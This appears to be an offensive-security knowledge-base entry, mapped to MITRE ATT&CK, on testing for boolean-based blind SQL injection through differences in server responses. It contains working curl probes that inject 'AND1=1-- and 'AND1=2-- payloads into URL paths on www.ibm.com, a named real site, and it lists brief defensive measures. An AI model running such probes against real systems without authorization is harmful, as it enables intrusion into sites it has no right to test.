---
id: proc-uuid-002
tags:
  - blind-sqli
  - boolean-based
  - web
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-http-request]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:26:22.296Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Test for Blind SQL Injection via Response Differences

## Summary

This procedure tests for blind SQL injection by crafting boolean payloads that trigger distinguishable server responses, such as endless redirects for true conditions and 500 errors for false, without direct output reflection.

## Description

Blind SQL injection exploits lack of error messages or output by inferring data through side-channel responses. Here, payloads influence query outcomes, causing behavioral differences in HTTP responses on vulnerable path processors. Applicable to sites like www.ibm.com where paths feed into SQL, this confirms exploitability despite restrictions on spaces and line breaks.

## Requirements

1. Confirmed injection point from prior reconnaissance
2. HTTP client for repeated requests (e.g., curl)
3. Understanding of boolean logic in SQL (AND, =, >)

## Defense

Defensive measures and detection strategies:

- Parameterize all dynamic SQL inputs, including paths
- Rate-limit requests to detect iterative probing
- Monitor for patterns of 500 errors followed by redirects

## Objectives

1. Distinguish true/false query outcomes
2. Confirm blind SQLi without visible errors
3. Bypass input restrictions like no spaces

## Instructions

### Step 1: Test True Boolean Condition

**Context**: Inject a always-true payload to observe success response.

**Command** ([[commands/curl-http-request]]):
```bash
curl -i "https://www.ibm.com/'AND1=1--/path"
```

> Uses comment -- to neutralize trailing query. Expected output: Endless redirect (e.g., 302 loops), indicating successful injection.

### Step 2: Test False Boolean Condition

**Context**: Inject a always-false payload to observe failure response.

**Command** ([[commands/curl-http-request]]):
```bash
curl -i "https://www.ibm.com/'AND1=2--/path"
```

> Expected output: HTTP 500 error, confirming response differentiation for blind testing.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-http-request]]

## Tools Used


## Tags

- [[blind-sqli]]
- [[web]]
